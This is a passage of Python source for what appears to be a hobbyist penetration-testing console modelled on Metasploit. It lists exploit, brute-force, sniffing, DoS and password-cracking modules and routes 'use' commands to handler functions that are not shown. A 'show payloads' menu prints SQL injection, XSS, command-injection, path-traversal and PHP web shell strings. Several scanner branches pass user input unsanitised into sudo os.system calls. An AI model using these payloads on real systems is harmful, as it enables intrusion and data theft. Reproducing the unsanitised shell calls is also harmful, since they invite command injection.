""" + color.red + """multi/ftp-login-test""" + color.white + """                                24/01/19 11:15       for login on port 21 or 20 ftp port.
""" + color.red + """multi/shell_reverse_tcp""" + color.white + """                             25/02/06 02:03       provides a reverse shell payload that can be used to establish a reverse shell connection.
""" + color.red + """multi/Typora_v1-7-4""" + color.white + """                                 24/01/29 08:48       Typora v1.7.4 - OS Command Injection.
""" + color.red + """multi/os_detector""" + color.white + """                                   25/02/19 12:43       try to detect the target OS with the port you typed.
""" + color.red + """multi/pop3-pass""" + color.white + """                                     25/02/20 11:57       exploits a buffer overflow vulnerability in a POP3 server.
""" + color.red + """multi/pop3-brute-force""" + color.white + """                              25/02/21 01:44       brute-forcing the pop3 port.
""" + color.red + """multi/nmap-version-detection""" + color.white + """                        25/04/04 10:35       uses nmap to detect version.
""" + color.red + """multi/ble-bypass""" + color.white + """                                    25/04/05 04:14       This is a vulnerability in the BLE protocol that allows attackers to bypass security measures and gain unauthorized access to a target system. The exploit involves exploiting a flaw in the encryption used in BLE connections.
""" + color.red + """multi/ble-scanner""" + color.white + """                                   25/04/04 11:01       scans bluetooths around you (sudo permission needed!).
""" + color.red + """multi/cve-2025-0282""" + color.white + """                                 25/04/18 07:25       Ivanti Connect Secure 22.7R2.5  - Remote Code Execution (RCE).
""" + color.red + """multi/generate_backdoor""" + color.white + """                             25/04/24 12:38       This exploit uses scpgenerator to generate a backdoor for you.
""" + color.red + """multi/nc-listener""" + color.white + """                                   25/04/25 04:24       starts a listener with netcat (netcat reqires!).
""")
    elif scconsole == "search osx":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """osx/ssh-login-test""" + color.white + """                                  24/01/11 05:54       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
""" + color.red + """osx/ftp-login-test""" + color.white + """                                  24/01/19 11:15       for login on port 21 or 20 ftp port.
""" + color.red + """osx/kernel_xnu_ip_fragment_privesc""" + color.white + """                  25/02/06 09:43       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
""" + color.red + """osx/kernel_xnu_ip_fragment_privesc_2""" + color.white + """                25/02/06 09:43       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
""")
    elif scconsole == "search linux":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """linux/ssh-login-test""" + color.white + """                                24/01/11 05:54       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
""" + color.red + """linux/ftp-login-test""" + color.white + """                                24/01/19 11:15       for login on port 21 or 20 ftp port.
""" + color.red + """linux/vulnerability-find""" + color.white + """                            25/02/08 09:27       find vulnerabilities like common open ports, if the password is weak, the kernal version.
""" + color.red + """linux/tcpdump_packet_sniffer""" + color.white + """                        04/04/05 12:17       tcpdump - ISAKMP Identification Payload Integer Overflow.
""")
    elif scconsole == "search server":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03 07:10        This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
""" + color.red + """server/extract_table_db_column""" + color.white + """                      25/02/08 09:30        extract sensitive information with the payloads have, extract informations like tables, columns, databases.
""" + color.red + """server/cve-2025-0001""" + color.white + """                                25/01/01 04:07        Remote Code Execution in Apache HTTP Server 2.4.54.
""" + color.red + """server/cve-2025-0006""" + color.white + """                                25/01/01 04:27        SQL Injection in MySQL 8.0.28.
""" + color.red + """server/php-cgi-arg-injection""" + color.white + """                        25/04/16 06:02        This exploit exploits a vulnerability in the PHP CGI (Common Gateway Interface) that allows an attacker to execute arbitrary commands on the server.
""")
    elif scconsole == "search dos":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """dos/ciscodos""" + color.white + """                                            03/07/22 10:07       Remote DoS against the recent Cisco IOS vuln.
""" + color.red + """dos/DD_D_Attack""" + color.white + """                                         25/02/01 02:01       for DoS and DDoS Attack (If your Internet is slow, that's gonna works slowly!).
""" + color.red + """dos/ble-dos""" + color.white + """                                             25/04/05 16:35       scans the bluetooths around you and then let you to choose target, trys to connect, then starts the attack.
""" + color.red + """dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS""" + color.white + """     25/04/27 12:55       Apache Commons FileUpload and Apache Tomcat DoS.
""")
    elif scconsole == "search php":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """php/RCE_via_PHP""" + color.white + """                                         25/02/18 12:53       This exploit exploits a vulnerability in a PHP application that allows arbitrary code execution on the server.
""" + color.red + """php/SOPlanning_1-52-01_RCE""" + color.white + """                              24/11/15 08:29       SOPlanning 1.52.01 (Simple Online Planning Tool) - Remote Code Execution (RCE)(Authenticated).
""" + color.red + """php/Wp2Fac""" + color.white + """                                              23/09/08 09:24       Wp2Fac - OS Command Injection.
""" + color.red + """php/POST-request""" + color.white + """                                        25/03/14 12:53       aims to upload a PHP file with a command execution payload to a vulnerable upload URL.
""" + color.red + """php/WordPress_Core_6-2_Directory_Traversal""" + color.white + """              25/04/27 12:34       WordPress Core 6.2 - Directory Traversal.
""")
    elif scconsole == "search auxiliary":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """auxiliary/robots_txt""" + color.white + """                                    25/02/21 07:47       Retrieves and parses robots.txt files.
""" + color.red + """auxiliary/dirs_brute""" + color.white + """                                    25/02/20 08:08       Brute forces directories on web servers.
""" + color.red + """auxiliary/http-version""" + color.white + """                                  25/02/21 08:18       Scans web servers for their HTTP version.
""" + color.red + """auxiliary/enum_apache_user""" + color.white + """                              25/02/21 09:50       Enumerates Apache users.
""" + color.red + """auxiliary/vuln-scan""" + color.white + """                                     25/02/21 10:17       Perform a vulnerability scan on a target.
""" + color.red + """auxiliary/smtp-version""" + color.white + """                                  25/02/22 10:24       Scan a target for SMTP vulnerabilities.
""" + color.red + """auxiliary/title""" + color.white + """                                         25/02/21 12:18       This exploit retrieves the title of the target webpage.
""" + color.red + """auxiliary/wordpress-scan""" + color.white + """                                25/01/21 12:22       scans the tagret web server to if that running wordpress.
""" + color.red + """auxiliary/wordpress-scan""" + color.white + """                                25/01/21 12:22       This exploit scans for Wordpress vulnerabilities on the target server.
""" + color.red + """auxiliary/drupal-scan""" + color.white + """                                   25/02/21 12:35       scans the target web server to if that running drupal.
""" + color.red + """auxiliary/cookie_stolen""" + color.white + """                                 25/02/24 04:56       finds cookies on the target website.
""" + color.red + """auxiliary/basic-auth""" + color.white + """                                    25/02/26 10:23       This module attempts to brute force HTTP basic authentication credentials.
""" + color.red + """auxiliary/ftp-anonymous""" + color.white + """                                 25/02/26 10:33       This module attempts to log into an FTP server anonymously.
""" + color.red + """auxiliary/http_put""" + color.white + """                                      25/02/26 06:19       This module attempts to PUT files on a web server.
""" + color.red + """auxiliary/ping-mssql""" + color.white + """                                    25/02/27 02:54       This module attempts to determine if a Microsoft SQL Server is running on a host.
""" + color.red + """auxiliary/webdav_scanner""" + color.white + """                                25/02/27 03:11       This module scans for WebDAV servers and their capabilities.
""" + color.red + """auxiliary/sitemap-generator""" + color.white + """                             25/02/27 03:18       This module generates a sitemap by crawling the target website.
""" + color.red + """auxiliary/password_cracking/crack-zip""" + color.white + """                   25/03/15 07:05       This module can crack password-protected ZIP files.
""" + color.red + """auxiliary/password_cracking/crack-pdf""" + color.white + """                   25/03/15 07:16       This module can crack password-protected PDF files.
""" + color.red + """auxiliary/password_cracking/crack-rar""" + color.white + """                   25/03/15 07:25       This module can crack password-protected RAR files.
""" + color.red + """auxiliary/password_cracking/crack-office""" + color.white + """                25/03/16 10:56       This module can crack password-protected Microsoft Office documents.
""" + color.red + """auxiliary/password_cracking/crack-windows-hash""" + color.white + """          25/03/17 06:20       This module can crack Windows password hashes using a dictionary attack or brute-force methods.
""" + color.red + """auxiliary/pipe_auditor""" + color.white + """                                  25/03/18 12:06       This module audits named pipes on an SMB server. It can be used to identify potential vulnerabilities or access points.
""" + color.red + """auxiliary/smb_enumshares""" + color.white + """                                25/03/18 12:16       This module enumerates shares on an SMB server. It can be used to identify potential vulnerabilities or access points.
""" + color.red + """auxiliary/web-spider""" + color.white + """                                    25/02/20 05:05       This module allows you to crawl websites and collect URLs, files, and other resources. It can be used to gather information for reconnaissance and vulnerability assessment.
""" + color.red + """auxiliary/apache_mod_status""" + color.white + """                             25/03/20 05:13       This module exploits Apache mod_status misconfiguration to obtain sensitive information about the server.
""" + color.red + """auxiliary/coldfusion_rce""" + color.white + """                                25/03/20 05:30       This module exploits ColdFusion remote command execution vulnerabilities to execute arbitrary commands.
""" + color.red + """auxiliary/http-form-brute""" + color.white + """                               25/03/21 11:19       This module attempts to brute-force HTTP form logins using a specified list of credentials.
""" + color.red + """auxiliary/sqli-xss-vuln""" + color.white + """                                 25/04/10 08:33       This exploit is for WEB Vulnerabilitie test, to test teh target website to see if it is vulnerable to sqli or xss.
""" + color.red + """auxiliary/check-login-vuln""" + color.white + """                              25/04/15 10:15       This exploit uses 10 sql injection payloads to find a vulnerabilitie on target login page.
""" + color.red + """auxiliary/password_cracking/crack_password""" + color.white + """              25/04/16 06:28       cracks the password hash with the wordlist and hash type you entered.
""")
    elif scconsole == "search sniffer":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """sniffer/sniffer""" + color.white + """                                         25/03/13 12:33       This module captures network traffic and logs it to a file.
""" + color.red + """sniffer/credential-collector""" + color.white + """                            25/03/14 01:23       This module collects cleartext credentials, such as passwords, from network traffic.
""" + color.red + """sniffer/inspect_traffic""" + color.white + """                                 25/03/16 11:10       This module analyzes network traffic and identifies potential vulnerabilities.
""" + color.red + """sniffer/SSLstrip""" + color.white + """                                        25/03/17 08:54       This module performs SSL stripping, which modifies HTTPS traffic to remove encryption and capture cleartext credentials.
""" + color.red + """sniffer/tcpdump-sniffer""" + color.white + """                                 25/03/18 11:34       This module starts a TCPdump sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
""" + color.red + """sniffer/ettercap-sniffer""" + color.white + """                                25/03/18 11:43       This module starts a TCPdump sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
""" + color.red + """sniffer/tshark-sniffer""" + color.white + """                                  25/03/18 11:55       This module starts a tshark sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
""" + color.red + """sniffer/ble-scanner""" + color.white + """                                     25/04/04 11:01       scans bluetooths around you (sudo permission needed!).
""")
    elif scconsole == "search scanner":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """scanner/portscan-tcp""" + color.white + """                                    25/04/08 09:28       scans for open ports.
""" + color.red + """scanner/ble-scanner""" + color.white + """                                     25/04/04 11:01       scans bluetooths around you (sudo permission needed!).
""" + color.red + """scanner/vnc-none-auth""" + color.white + """                                   25/04/08 09:46       scans the VNC port to see if it is open or closed.
""" + color.red + """scanner/ftp-anon""" + color.white + """                                        25/04/08 09:54       scans target port 21 to if anonymous access is enabled on port 21 (ftp port).
""" + color.red + """scanner/portmap-amp""" + color.white + """                                     25/04/08 10:01       attempts to connect to a web server at the specified IP address and checks the response for indicators of an AMP stack (Apache, MySQL, PHP).
""" + color.red + """scanner/subdomain-scan""" + color.white + """                                  25/04/10 08:05       This scanner exploits the subdomain scanner to look for specific subdomains by using a wordlist.
""" + color.red + """scanner/portscan""" + color.white + """                                        25/04/10 08:13       scans the port you specified to see they are open or closed.
""" + color.red + """scanner/ping_ip_site""" + color.white + """                                    25/04/15 09:49       uses ping tool to make sure target or website is reachable.
""" + color.red + """scanner/http-options""" + color.white + """                                    25/05/01 03:41       scan the specified host for the available HTTP methods and print the results.
""" + color.red + """scanner/https-options""" + color.white + """                                   25/05/01 03:43       scan the specified host for the available HTTP methods and print the results.
""" + color.red + """scanner/server-scanner""" + color.white + """                                  25/05/01 04:06       It sends an HTTP GET request to the target URL and retrieves the server headers. If the server header indicates PHP, it extracts the PHP version and returns it.
""")
    elif scconsole == "show payloads":
        print("""
""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.

""" + color.green + """<script>alert('XSS')</script>""" + color.white + """  ---> cross site XSS alert payload.

""" + color.green + """<img src=x onerror=alert('XSS')>""" + color.white + """  ---> cross site XSS onerror payload.

""" + color.green + """;whoami""" + color.white + """  ---> remote code execute whoami payload.

""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.

""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.

""" + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.

""" + color.green + """<a href=javascript:alert('XSS')>Click Me</a>""" + color.white + """  ---> cross site XSS Click Me payload.

""" + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.

""" + color.green + """shell_reverse_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.

""" + color.green + """UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--""" + color.white + """   ---> SQL Injection union payload.

""" + color.green + """admin' OR 1=1 LIMIT 1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """;echo system($_GET["cmd"]);//""" + color.white + """   ---> Command execution payload.

""" + color.green + """reverse_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.

""" + color.green + """bind_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.

""" + color.green + """php_reverse_shell""" + color.white + """ ---> trys to get a reverse shell with php from target, then connects back to the attacker.

""" + color.green + """bash_reverse_shell""" + color.white + """ ---> trys to get a reverse shell with bash from target, then connects back to the attacker.

""" + color.green + """ruby_reverse_shell""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.
""")
    elif scconsole == "db_scscanner -h":
        print("""
Usage: db_scscanner [option]

Examples: db_scscanner -o
          db_scscanner -p
          db_scscanner -w
          db_scscanner -h
          db_scscanner results
          db_scscanner -n-scan

Options:
  -h --->   Display this help message
  -p --->   Scan specific ports on a host
  -o --->   Scan for the operating system of a host from 7,21,22,80 and 8080 ports
  -w --->   Scan a website for open ports from 1 to 65536
  results --->   Display the scans you done
  -n-scan --->   Normal scan

Arguments:
  [host]               Single host IP address or range (e.g., 10.11.1.0 or 10.11.1.1-254)
  [port]               Single port number or comma-separated list of ports (e.g., 80 or 7,22,80,8080)
  [website]            Website URL (e.g., example.com)

the tool will asks for target IP or URL!

sudo reqired!!
""")
    elif scconsole == "db_scscanner":
        print("""
Usage: db_scscanner [option]

Examples: db_scscanner -o
          db_scscanner -p
          db_scscanner -w
          db_scscanner -h
          db_scscanner results
          db_scscanner -n-scan

Options:
  -h --->   Display this help message
  -p --->   Scan specific ports on a host
  -o --->   Scan for the operating system of a host from 7,21,22,80 and 8080 ports
  -w --->   Scan a website for open ports from 1 to 65536
  results --->   Display the scans you done
  -n-scan --->   Normal scan

Arguments:
  [host]               Single host IP address or range (e.g., 10.11.1.0 or 10.11.1.1-254)
  [port]               Single port number or comma-separated list of ports (e.g., 80 or 7,22,80,8080)
  [website]            Website URL (e.g., example.com)

the tool will asks for target IP or URL!

sudo reqired!!
""")
    elif scconsole == "db_scscanner -n-scan":
        targetsip00 = input("Enter taregt IP: ")
        os.system(f'sudo python db_scscanner.py {targetsip00}')
    elif scconsole == "db_scscanner -p":
        targetportsorport = input("Enter the ports or port: ")
        targetip00 = input("Enter Target IP: ")
        os.system(f'sudo python db_scscanner.py -p={targetportsorport} {targetip00}')
    elif scconsole == "db_scscanner -o":
        targetip331 = input("Enter tagret IP: ")
        os.system(f'sudo python db_scscanner.py -o {targetip331}')
    elif scconsole == "db_scscanner -w":
        targeturl441 = input("Enter target URL: ")
        os.system(f'sudo python db_scscanner.py -w {targeturl441}')
    elif scconsole == "db_scscanner results":
        os.system(f'python db_scscanner.py results')
    elif scconsole == "use exploit/bypassuac-eventvwr":
        time.sleep(0.5)
        print("using exploit/bypassuac-eventvwr.")
        exploitbypassuaceventvwr()
    elif scconsole == "use exploit/find-vulnerabilites-scan":
        time.sleep(0.5)
        print("using exploit/find-vulnerabilites-scan.")
        exploitfindvulnerabilitesscan()
    elif scconsole == "use exploit/ssh-version":
        time.sleep(0.5)
        print("using exploit/ssh-version.")
        exploitsshversion()
    elif scconsole == "use exploit/reverse-shell":
        time.sleep(0.5)
        print("using exploit/reverse-shell.")
        exploitreverseshell()
    elif scconsole == "use exploit/handler/handler":
        time.sleep(0.5)
        print("using exploit/handler/handler.")
        exploithandlerhandler()
    elif scconsole == "use exploit/handler/listining":
        time.sleep(0.5)
        print("using exploit/handler/listining.")
        exploithandlerlistining()
    elif scconsole == "use exploit/cve-2023-22518/cve-2023-22518":
        time.sleep(0.5)
        print("using exploit/cve-2023-22518/cve-2023-22518.")
        exploitcve202322518cve202322518()
    elif scconsole == "use exploit/cve-2023-22518/vuln-test-for-cve-2023-22518":
        time.sleep(0.5)
        print("using exploit/cve-2023-22518/vuln-test-for-cve-2023-22518.")
        exploitvulncve202322518cve202322518()
    elif scconsole == "use windows/ssh-login-test":
        time.sleep(0.5)
        print("using windows/ssh-login-test.")
        wexploitsshlogintest()
    elif scconsole == "use windows/java-rhino":
        time.sleep(0.5)
        print("using windows/java-rhino.")
        wexploitjavarhino()
    elif scconsole == "use windows/ms17_010":
        time.sleep(0.5)
        print("using windows/ms17_010.")
        wexploitms17010psexec()
    elif scconsole == "use windows/PDF-exploit":
        time.sleep(0.5)
        print("using windows/PDF-exploit.")
        wexploitPDFexploit()
    elif scconsole == "use windows/ftp-login-test":
        time.sleep(0.5)
        print("using windows/ftp-login-test.")
        wexploitftplogintest()
    elif scconsole == "use windows/7-zip_cve-2025-0411":
        time.sleep(0.5)
        print("using windows/7-zip_cve-2025-0411.")
        w7zipcve20250411()
    elif scconsole == "use site/XSS-SQLi-PHP-PASS":
        time.sleep(0.5)
        print("using site/XSS-SQLi-PHP-PASS.")
        texploitXSS()
    elif scconsole == "use dos/DD_D_Attack":
        time.sleep(0.5)
        print("using dos/DD_D_Attack.")
        texploitDDDAttack()
    elif scconsole == "use site/vuln-curl-website":
        time.sleep(0.5)
        print("using site/vuln-curl-website.")
        texploitfindvulnerabiliteswebsite()
    elif scconsole == "use site/find-vulnerabilites-website2":
        time.sleep(0.5)
        print("using site/find-vulnerabilites-website2.")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole == "use site/http-login-test":
        time.sleep(0.5)
        print("using site/http-login-test.")
        texploithttplogintest()
    elif scconsole == "use site/ZIP-exploit":
        time.sleep(0.5)
        print("using site/ZIP-exploit.")
        texploitZIPexploit()
    elif scconsole == "use site/tomcat-mgr-login":
        time.sleep(0.5)
        print("using site/tomcat-mgr-login.")
        texploittomcatmgrlogin()
    elif scconsole == "use site/Directory-finder":
        time.sleep(0.5)
        print("using site/Directory-finder.")
        tdirectoryfinder()
    elif scconsole == "use site/struts2_namespace_ognl":
        time.sleep(0.5)
        print("using site/struts2_namespace_ognl.")
        tstruts2namespaceognl()
    elif scconsole == "use multi/ssh-login-test":
        time.sleep(0.5)
        print("using multi/ssh-login-test.")
        mexploitsshlogintest()
    elif scconsole == "use multi/ftp-login-test":
        time.sleep(0.5)
        print("using multi/ftp-login-test.")
        mexploitftplogintest()
    elif scconsole == "use multi/shell_reverse_tcp":
        time.sleep(0.5)
        print("using multi/shell_reverse_tcp.")
        mexploitreverseshell()
    elif scconsole == "use osx/kernel_xnu_ip_fragment_privesc":
        time.sleep(0.5)
        print("using osx/kernel_xnu_ip_fragment_privesc.")
        osxkernelxnuipfragmentprivesc()
    elif scconsole == "use osx/kernel_xnu_ip_fragment_privesc_2":
        time.sleep(0.5)
        print("using osx/kernel_xnu_ip_fragment_privesc_2.")
        osxkernelxnuipfragmentprivesc2()
    elif scconsole == "use osx/ssh-login-test":
        time.sleep(0.5)
        print("using osx/ssh-login-test.")
        oexploitsshlogintest()
    elif scconsole == "use osx/ftp-login-test":
        time.sleep(0.5)
        print("using osx/ftp-login-test.")
        oexploitftplogintest()
    elif scconsole == "use linux/ssh-login-test":
        time.sleep(0.5)
        print("using linux/ssh-login-test.")
        lexploitsshlogintest()
    elif scconsole == "use linux/ftp-login-test":
        time.sleep(0.5)
        print("using linux/ftp-login-test.")
        lexploitftplogintest()
    elif scconsole == "use site/reverse_http":
        time.sleep(0.5)
        print("using site/reverse_http.")
        treversehttp()
    elif scconsole == "use server/browser_autopwn2":
        time.sleep(0.5)
        print("using server/browser_autopwn2.")
        sserverbrowserautopwn2()
    elif scconsole == "use server/extract_table_db_column":
        time.sleep(0.5)
        print("using server/extract_table_db_column.")
        sserverextracttabledbcolumn()
    elif scconsole == "use linux/vulnerability-find":
        time.sleep(0.5)
        print("using linux/vulnerability-find.")
        lexploitvulnerabilityfind()
    elif scconsole == "use site/cve-2022-24521":
        time.sleep(0.5)
        print("using site/cve-2022-24521.")
        tcve202224521()
    elif scconsole == "use site/information-gather":
        time.sleep(0.5)
        print("using site/information-gather.")
        tinformationgather()
    elif scconsole == "use site/port-scan":
        time.sleep(0.5)
        print("using site/port-scan.")
        tportscan()
    elif scconsole == "use dos/ciscodos":
        time.sleep(0.5)
        print("using dos/ciscodos.")
        dciscodos()
    elif scconsole == "use windows/MS04-007_LSASS-exe_Pro_Remote_DoS":
        time.sleep(0.5)
        print("using windows/MS04-007_LSASS-exe_Pro_Remote_DoS.")
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole == "use linux/tcpdump_packet_sniffer":
        time.sleep(0.5)
        print("using linux/tcpdump_packet_sniffer.")
        ltcpdumppacketsniffer()
    elif scconsole == "use php/RCE_via_PHP":
        time.sleep(0.5)
        print("using php/RCE_via_PHP.")
        pRCEviaPHP()
    elif scconsole == "use php/SOPlanning_1-52-01_RCE":
        time.sleep(0.5)
        print("using php/SOPlanning_1-52-01_RCE.")
        pSOPlanning15201RCE()
    elif scconsole == "use multi/Typora_v1-7-4":
        time.sleep(0.5)
        print("using multi/Typora_v1-7-4.")
        mTyporav174()
    elif scconsole == "use php/Wp2Fac":
        time.sleep(0.5)
        print("using php/Wp2Fac.")
        pWp2Fac()
    elif scconsole == "use multi/os_detector":
        time.sleep(0.5)
        print("using multi/os_detector.")
        mosdetector()
    elif scconsole == "use multi/pop3-pass":
        time.sleep(0.5)
        print("using multi/pop3-pass.")
        mpop3pass()
    elif scconsole == "use multi/pop3-brute-force":
        time.sleep(0.5)
        print("using multi/pop3-brute-force.")
        mpop3bruteforce()
    elif scconsole == "use auxiliary/robots_txt":
        time.sleep(0.5)
        print("using auxiliary/robots_txt.")
        aauxiliaryrobotstxt()
    elif scconsole == "use auxiliary/dirs_brute":
        time.sleep(0.5)
        print("using auxiliary/dirs_brute.")
        aauxiliarydirsbrute()
    elif scconsole == "use auxiliary/http-version":
        time.sleep(0.5)
        print("using auxiliary/http-version.")
        aauxiliaryhttpversion()
    elif scconsole == "use auxiliary/enum_apache_user":
        time.sleep(0.5)
        print("using auxiliary/enum_apache_user.")
        aauxiliaryenumapacheuser()
    elif scconsole == "use auxiliary/vuln-scan":
        time.sleep(0.5)
        print("using auxiliary/vuln-scan.")
        aauxiliaryvulnscan()
    elif scconsole == "use auxiliary/smtp-version":
        time.sleep(0.5)
        print("using auxiliary/smtp-version.")
        aauxiliarysmtpversion()
    elif scconsole == "use windows/shell-storm":
        time.sleep(0.5)
        print("using windows/shell-storm.")
        wshellstorm()
    elif scconsole == "use auxiliary/title":
        time.sleep(0.5)
        print("using auxiliary/title.")
        aauxiliarytitle()
    elif scconsole == "use auxiliary/wordpress-scan":
        time.sleep(0.5)
        print("using auxiliary/wordpress-scan.")
        aauxiliarywordpressscan()
    elif scconsole == "use auxiliary/wordpress-vuln":
        time.sleep(0.5)
        print("using auxiliary/wordpress-vuln.")
        aauxiliarywordpressvuln()
    elif scconsole == "use auxiliary/drupal-scan":
        time.sleep(0.5)
        print("using auxiliary/drupal-scan.")
        aauxiliarydrupalscan()
    elif scconsole == "use auxiliary/cookie_stolen":
        time.sleep(0.5)
        print("using auxiliary/cookie_stolen.")
        aauxiliarycookiestolen()
    elif scconsole == "use site/Aurba-501":
        time.sleep(0.5)
        print("using site/Aurba-501.")
        tAurba501()
    elif scconsole == "use site/HughesNet-HT2000W-Satellite-Modem":
        time.sleep(0.5)
        print("using site/HughesNet-HT2000W-Satellite-Modem.")
        tHughesNetHT2000WSatelliteModem()
    elif scconsole == "use auxiliary/basic-auth":
        time.sleep(0.5)
        print("using auxiliary/basic-auth.")
        aauxiliarybasicauth()
    elif scconsole == "use auxiliary/ftp-anonymous":
        time.sleep(0.5)
        print("using auxiliary/ftp-anonymous.")
        aauxiliaryftpanonymous()
    elif scconsole == "use auxiliary/http_put":
        time.sleep(0.5)
        print("using auxiliary/http_put.")
        aauxiliaryhttpput()
    elif scconsole == "use auxiliary/ping-mssql":
        time.sleep(0.5)
        print("using auxiliary/ping-mssql.")
        aauxiliarypingmssql()
    elif scconsole == "use auxiliary/webdav_scanner":
        time.sleep(0.5)
        print("using auxiliary/webdav_scanner.")
        aauxiliarywebdavscanner()
    elif scconsole == "use auxiliary/sitemap-generator":
        time.sleep(0.5)
        print("using auxiliary/sitemap-generator.")
        aauxiliarysitemapgenerator()
    elif scconsole == "use server/cve-2025-0001":
        time.sleep(0.5)
        print("using server/cve-2025-0001.")
        sservercve20250001()
    elif scconsole == "use server/cve-2025-0006":
        time.sleep(0.5)
        print("using server/cve-2025-0006.")
        sservercve20250006()
    elif scconsole == "use windows/reverse_tcp":
        time.sleep(0.5)
        print("using windows/reverse_tcp.")
        wreversetcp()
    elif scconsole == "use exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti":
        time.sleep(0.5)
        print("using exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti.")
        eexploitCVE20250282IvantiexploitCVE20250282Ivanti()
    elif scconsole == "use site/Devika-v1-Path-Traversal":
        time.sleep(0.5)
        print("using site/Devika-v1-Path-Traversal.")
        tDevikav1PathTraversal()
    elif scconsole == "use sniffer/sniffer":
        time.sleep(0.5)
        print("using sniffer/sniffer.")
        sssniffersniffer()
    elif scconsole == "use php/POST-request":
        time.sleep(0.5)
        print("using php/POST-request.")
        pPOSTrequest()
    elif scconsole == "use sniffer/credential-collector":
        time.sleep(0.5)
        print("using sniffer/credential-collector.")
        sssniffercredentialcollector()
    elif scconsole == "use auxiliary/password_cracking/crack-zip":
        time.sleep(0.5)
        print("using auxiliary/password_cracking/crack-zip.")
        aauxiliarypasswordcrackingcrackzip()
    elif scconsole == "use auxiliary/password_cracking/crack-pdf":
        time.sleep(0.5)
        print("using auxiliary/password_cracking/crack-pdf.")
        aauxiliarypasswordcrackingcrackpdf()
    elif scconsole == "use auxiliary/password_cracking/crack-rar":
        time.sleep(0.5)
        print("using auxiliary/password_cracking/crack-rar.")
        aauxiliarypasswordcrackingcrackrar()
    elif scconsole == "use auxiliary/password_cracking/crack-office":
        time.sleep(0.5)
        print("using auxiliary/password_cracking/crack-office.")
        aauxiliarypasswordcrackingcrackoffice()
    elif scconsole == "use sniffer/inspect_traffic":
        time.sleep(0.5)
        print("using sniffer/inspect_traffic.")
        sssnifferinspecttraffic()
    elif scconsole == "use auxiliary/password_cracking/crack-windows-hash":
        time.sleep(0.5)
        print("using auxiliary/password_cracking/crack-windows-hash.")
        aauxiliarypasswordcrackingcrackwindowshash()
    elif scconsole == "use sniffer/SSLstrip":
        time.sleep(0.5)
        print("using sniffer/SSLstrip.")
        sssnifferSSLstrip()
    elif scconsole == "use sniffer/tcpdump-sniffer":
        time.sleep(0.5)
        print("using sniffer/tcpdump-sniffer.")
        sssniffertcpdumpsniffer()
    elif scconsole == "use sniffer/ettercap-sniffer":
        time.sleep(0.5)
        print("using sniffer/ettercap-sniffer.")
        sssnifferettercapsniffer()
    elif scconsole == "use auxiliary/pipe_auditor":
        time.sleep(0.5)
        print("using auxiliary/pipe_auditor.")
        aauxiliarypipeauditor()
    elif scconsole == "use auxiliary/smb_enumshares":
        time.sleep(0.5)
        print("using auxiliary/smb_enumshares.")
        aauxiliarysmbenumshares()
    elif scconsole == "use auxiliary/web-spider":
        time.sleep(0.5)
        print("using auxiliary/web-spider.")
        aauxiliarywebspider()
    elif scconsole == "use auxiliary/apache_mod_status":
        time.sleep(0.5)
        print("using auxiliary/apache_mod_status.")
        aauxiliaryapachemodstatus()
    elif scconsole == "use auxiliary/coldfusion_rce":
        time.sleep(0.5)
        print("using auxiliary/coldfusion_rce.")
        aauxiliarycoldfusionrce()
    elif scconsole == "use auxiliary/http-form-brute":
        time.sleep(0.5)
        print("using auxiliary/http-form-brute.")
        aauxiliaryhttpformbrute()
    elif scconsole == "use multi/nmap-version-detection":
        time.sleep(0.5)
        print("using multi/nmap-version-detection.")
        multinmapversiondetection()
    elif scconsole == "use sniffer/ble-scanner":
        time.sleep(0.5)
        print("using sniffer/ble-scanner.")
        snifferblescanner()
    elif scconsole == "use multi/ble-bypass":
        time.sleep(0.5)
        print("using multi/ble-bypass.")
        multiblebypass()
    elif scconsole == "use multi/ble-scanner":
        time.sleep(0.5)
        print("using multi/ble-scanner.")
        multiblescanner()
    elif scconsole == "use dos/ble-dos":
        time.sleep(0.5)
        print("using dos/ble-dos.")
        dosbledos()
    elif scconsole == "use scanner/portscan-tcp":
        time.sleep(0.5)
        print("using scanner/portscan-tcp.")
        scannerportscantcp()
    elif scconsole == "use scanner/ble-scanner":
        time.sleep(0.5)
        print("using scanner/ble-scanner.")
        scannerblescanner()
    elif scconsole == "use scanner/vnc-none-auth":
        time.sleep(0.5)
        print("using scanner/vnc-none-auth.")
        scannervncnoneauth()
